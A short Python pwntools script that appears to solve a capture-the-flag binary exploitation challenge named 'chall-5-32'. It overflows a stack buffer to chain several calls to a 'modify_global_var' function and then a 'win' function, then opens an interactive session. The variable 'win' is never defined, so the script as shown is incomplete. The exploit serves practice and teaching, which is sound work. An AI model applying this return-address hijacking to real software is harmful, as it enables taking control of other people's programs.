#!/usr/bin/env python3

from pwn import *

io = process("./chall-5-32")

exe = ELF("./chall-5-32")
context.binary = exe

modify = exe.symbols["modify_global_var"]

payload = flat({
    0x48+0x4  : modify,
    0x48+0x8  : modify,
    0x48+0xc  : modify,
    0x48+0x10 : win,
})

io.sendlineafter(b": ", payload)

io.interactive()
